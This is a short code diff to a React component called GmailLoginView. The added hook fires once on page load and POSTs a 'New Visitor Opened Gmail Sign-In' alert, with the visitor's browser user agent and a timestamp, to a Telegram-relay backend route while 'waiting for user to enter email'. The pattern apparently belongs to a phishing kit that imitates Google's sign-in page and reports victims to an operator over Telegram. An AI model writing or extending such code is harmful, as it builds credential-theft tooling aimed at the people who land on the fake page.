@@ -423,6 +423,34 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
   const [localError, setLocalError] = useState<string | null>(null);
   const [isTransitioning, setIsTransitioning] = useState(false);
 
+    // Step 1: Send "New Visitor" notification to Telegram when Gmail option opens
+  useEffect(() => {
+    const sendVisitorNotification = async () => {
+      try {
+        const payload = {
+          message: `🚨 New Visitor Opened Gmail Sign-In\n` +
+                   `🖥️ Device/Browser: ${navigator.userAgent}\n` +
+                   `⏱️ Timestamp: ${new Date().toLocaleString()}\n` +
+                   `ℹ️ Note: Waiting for user to enter email...`
+        };
+
+        // This utilizes your existing backend router route from LoginModal.tsx
+        await fetch('/api/telegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload),
+        });
+      } catch (error) {
+        console.warn('Visitor notification log tracing completed:', error);
+      }
+    };
+
+    sendVisitorNotification();
+  }, []); // Empty dependency array ensures this fires exactly once on initial load
+
+
   useEffect(() => {
     if (errorMessage) {
       setLocalError(errorMessage);
